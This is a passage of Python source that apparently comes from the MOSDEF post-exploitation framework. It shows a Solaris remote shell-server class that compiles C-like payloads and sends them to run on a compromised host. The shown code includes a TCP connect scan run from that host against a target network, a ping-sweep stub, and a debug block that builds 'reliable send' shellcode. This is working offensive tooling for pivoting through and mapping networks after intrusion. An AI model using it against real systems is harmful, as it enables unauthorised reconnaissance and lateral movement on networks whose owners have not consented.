          vars["addr"] = str2bigendian(socket.inet_aton(addr))

          self.clearfunctioncache()
          request = self.compile(code,vars)
          self.sendrequest(request)
          fd = self.readint()
          self.leave()
          return fd
     
     def tcpConnectScan(self,network,startport=1,endport=1024):
          """
          Connectscan from the remote host! 
          """


          if network.count("/"):
               network,netmask=network.split("/")
          else:
               netmask=32
          netmask=int(netmask)
          
          hostlong=socket.gethostbyname(network) #resolve from remotehost
          hostlong=str2bigendian(socket.inet_aton(hostlong))
          numberofips=2**(32-netmask) #how many ip's total
          startip=hostlong&(~(numberofips-1)) #need to mask it out so we don't do wacky things

          vars = self.libc.getdefines()
          vars["startip"]=startip
          vars["numberofips"]=numberofips
          vars["startport"]=startport
          vars["endport"]=endport
          
          code="""
          #import "local", "connect" as "connect"
          #import "local", "close" as "close"
          #import "local", "socket" as "socket"
          #import "local", "sendint" as "sendint"
          #import "local", "htons" as "htons"
          #import "local", "htonl" as "htonl"
          #import "local", "debug" as "debug"
          #import "int", "startip" as "startip"         
          #import "int", "startport" as "startport"
          #import "int", "endport" as "endport"
          #import "int", "numberofips" as "numberofips"
          #import "int", "AF_INET" as "AF_INET"
          #import "int", "SOCK_STREAM" as "SOCK_STREAM"
          #include "socket.h"
          
          void main()
          {
            int currentport;
            int sockfd;
            int fd;
            int doneips;
            int currentip;
            
            struct sockaddr_in serv_addr;
            
            serv_addr.family=AF_INET; //af_inet
            currentip=startip;
            doneips=0;
            
            while (doneips<numberofips)
            {
                 //FOR EACH IP...
                 doneips=doneips+1;
                 serv_addr.addr=htonl(currentip);
                 currentport=startport;
                 while (currentport<endport) {
                   //FOR EACH PORT
                   //debug();
                   sockfd=socket(AF_INET,SOCK_STREAM,0);
                   //debug();
                   serv_addr.port=currentport;
                   if (connect(sockfd,&serv_addr,16)==0) {
                     //sendint(23);
                     sendint(currentport);
                   }
                   //debug();
                   //sendint(22);
                   close(sockfd);
                   //sendint(20);
                   currentport=currentport+1;
                   //sendint(21);

                 }
                 currentip=currentip+1;
            }
           sendint(0xffffffff);
          }
          """
          self.clearfunctioncache()
          request=self.compile(code,vars)
          self.sendrequest(request)
          
          port=0
          openports=[]
          while port!=-1:
               port=sint32(self.readint())
               if port!=-1:
                    openports.append(port)
          self.leave()
          return openports
     
     def pingSweep(self,network):
          """
          pingsweep the target network
          """

solarisshellserver = MosdefShellServer('Solaris', 'sparc')
solarisx86shellserver = MosdefShellServer('Solaris', 'intel')

# for debugging          
if __name__== '__main__':
     """Reliable send to socket, returns a shellcode for use by Node and self"""
     from MOSDEF.remoteresolver import remoteresolver
 
     code="""
     #import "int", "length" as "length"
     #import "int", "fd" as "fd"
     #import "string", "buffer" as "buffer"
     #import "local", "send" as "send"
      void main()
        {
             int i;
             char *p;
             int wanted;
             wanted=length;
             p=buffer;
             while (wanted > 0 ) {
             i=send(fd,p,wanted,0); // flags set to zero here
             if (i<0) {
               wanted=0;
              }
              wanted=wanted-i;
              p=p+i;
             }
           }
     """
     fd = 0
     buffer = "A\n"*1500
     print "Sending %d bytes to fd %d"%(len(buffer),fd)
     vars={}
     vars["fd"]=fd
     vars["length"]=len(buffer)
     vars["buffer"]=buffer
     from solarisremoteresolver import solarisremoteresolver
     app = remoteresolver("Solaris","sparc")
     app.clearfunctioncache()
     message=app.compile(code,vars)
     #print message
     
     ss=solarisshellserver()
     ss.socket()
 
